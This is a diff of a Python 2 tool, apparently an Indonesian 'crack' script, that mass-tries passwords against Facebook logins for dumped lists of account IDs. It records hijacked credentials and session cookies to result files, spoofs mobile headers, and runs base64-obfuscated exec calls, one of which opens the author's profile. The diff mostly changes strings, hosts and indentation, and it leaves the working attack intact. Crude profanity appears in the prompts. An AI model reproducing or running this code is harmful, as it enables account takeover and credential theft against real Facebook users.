@@ -21,17 +21,17 @@ import os
 try:
     import requests
 except ImportError:
-    print '\n• modul requests belum terinstall \n'
+    print '\n INSTALL MODUL requests \n'
     os.system('pip2 install requests')
 try:
     import concurrent.futures
 except ImportError:
-    print '\n• modul futures belum terinstall \n'
+    print '\n• INSTALL MODUL futures \n'
     os.system('pip2 install futures')
 try:
     import bs4
 except ImportError:
-    print '\n• modul bs4 belum terinstall \n'
+    print '\n• INSTALL MODUL bs4 \n'
     os.system('pip2 install bs4')
 
 import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
@@ -62,7 +62,7 @@ def tik():
 ip = requests.get('https://api.ipify.org').text
 exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
 def banner():
-    print (' %sAUTHOR : HundinTogam %sRecode : HundinTogam %sHANZ GANTENG %s# %s---------------------------------------- %s#  '%
+    print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
     (M,til,K,til,H,til,M,til,K,til,H,til,M,P,U,til,K,M,K,author,U,til,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
     print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,ip,M))
     
@@ -70,12 +70,12 @@ def banner():
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
     os.system('clear');banner()
-    print ('\n%s%s%s 01 %sLOGIN WITH TOKEN \n%s%s%s 02%s TUTOR TAKE TOKEN \n%s%s%s 00 %sKELUAR'%(U,til,K,O,U,til,K,O,U,til,M,O))
+    print ('\n%s%s%s 01 %sLOGIN WITH TOKEN \n%s%s%s 02%s TUTOR TAKE TOKEN \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,M,O))
     rom = raw_input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
     if rom in(""):
     	print("%s%s SALAH KONTOL "%(M,til));exit()
     elif rom in ('1','01'):
-        jalan("\n%s!%s JANGAN PAKAI AKUN UTAMA YA KONTOLLLL !"%(M,O))
+        jalan("\n%s!%s JANGAN PAKAI AKUN UTAMA BOS"%(M,O))
     	romz = raw_input("%s# %sTOKEN ISI DISINI %s> %s"%(P,O,M,K))
         if romz in(""):
         	print ("%s%s ISI KONTOLLLL !!!! "%(M,til))
@@ -85,7 +85,7 @@ def masuk():
             open('data/token.txt', 'w').write(romz);login_xx()
             exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
         except (KeyError,IOError):
-        	print ("%s%s TOKEN SALAH "%(M,til));jeda(2);masuk()
+        	print ("%s%s Token invalid "%(M,til));jeda(2);masuk()
     elif rom in ('2', '02'):
     	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
         print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
@@ -192,7 +192,7 @@ def publik(romz,headers=header):
             sys.stdout.flush();jeda(0.0050)
 
         bff.close()
-        print ('\n\n%s%s Mantap kontol, dump berhasil dari %s'%(H,til,nm['name']))
+        print ('\n\n%s%s Succes dump id dari %s'%(H,til,nm['name']))
         print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
         raw_input('\n%s%s%s Kembali '%(U,til,O))
         menu()
@@ -607,7 +607,7 @@ class ngentod:
 
     def mbasic(self, user, xxh):
         global ok,cp,loop
-        print('\r%s%s%s [Proses] %s|%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
+        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in xxh:
             pw = pw.lower()
@@ -624,7 +624,7 @@ class ngentod:
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print ('\r %s %s | %s | %s  ' % (H,user,pw,kuki))
-                wrt = ('  %s|%s|%s' % (user,pw,kuki))
+                wrt = ('  %s | %s | %s' % (user,pw,kuki))
                 ok.append(wrt)
                 open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -636,7 +636,7 @@ class ngentod:
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print ('\r %s %s | %s | %s %s %s ' % (K,user,pw,day,month,year))
-                    wrt = ('  %s|%s|%s %s %s' % (user,pw,day,month,year))
+                    wrt = ('  %s | %s | %s %s %s' % (user,pw,day,month,year))
                     cp.append(wrt)
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -653,28 +653,44 @@ class ngentod:
 
         loop += 1
 
-def mobile(self, user, xxh):
+    def mobile(self, user, xxh):
         global ok,cp,loop
-        print('\r%s%s%s [Proses] %s|%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
+        print('\r%s%s%s [KREK] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in xxh:
             pw = pw.lower()
             try: os.mkdir('hasil')
             except: pass
             try:
-                ua = open('data/ua.txt', 'r').read()
+            	ua = open('data/ua.txt', 'r').read()
             except (KeyError, IOError):
-                ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
+            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
             ses = requests.Session()
-            ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://free.facebook.com")
-            b = ses.post("https://free.facebook.com/login/?ref=dbl&fl&refid=9", data={"email": user, "pass": pw, "login": "submit"})
+            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://m.facebook.com")
+            b = bs4.BeautifulSoup(p.text, 'html.parser')
+            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+            data = {}
+            for mi in b('input'):
+            	if mi.get('value') is None:
+            	    if mi.get('name') == 'email':
+            	        data.update({"email":user})
+                    elif mi.get("name")=="pass":
+                    	data.update({"pass":pw})
+                    else:
+                    	data.update({mi.get('name'): ''})
+                else:
+                	data.update({mi.get('name'): mi.get('value')})
+            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
+            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+            ses.headers.update({'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+            po = ses.post('https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print ('\r %s %s | %s | %s  ' % (H,user,pw,kuki))
-                wrt = ('  %s|%s|%s' % (user,pw,kuki))
+            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r %s %s | %s | %s  ' % (H,user,pw,kuki)
+                wrt = '  %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
-                open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
+                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -683,8 +699,8 @@ def mobile(self, user, xxh):
                     lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print ('\r %s %s | %s | %s %s %s ' % (K,user,pw,day,month,year))
-                    wrt = ('  %s|%s|%s %s %s' % (user,pw,day,month,year))
+                    print '\r %s %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
+                    wrt = '  %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -692,8 +708,8 @@ def mobile(self, user, xxh):
                     lahir = ''
                 except:
                     pass
-                print ('\r %s %s | %s           ' % (K,user,pw))
-                wrt = ('  %s | %s' % (user,pw))
+                print '\r %s %s | %s           ' % (K,user,pw)
+                wrt = ' %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -701,7 +717,7 @@ def mobile(self, user, xxh):
 
         loop += 1
 
-   def sung(self):
+    def sung(self):
         ii = raw_input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
         if ii == '':
             print '\n%s%s isi yang benar '%(M,til);self.sung()
@@ -789,10 +805,10 @@ def opsi():
 	menu()
 	
 def mengecek(user, pw):
-	mb = ("https://free.facebook.com")
+	mb = ("https://mbasic.facebook.com")
 	ua = ("Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996")
 	ses = requests.Session()
-	ses.headers.update({"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	data = {}
 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
 	fm = ged.find("form",{"method":"post"})
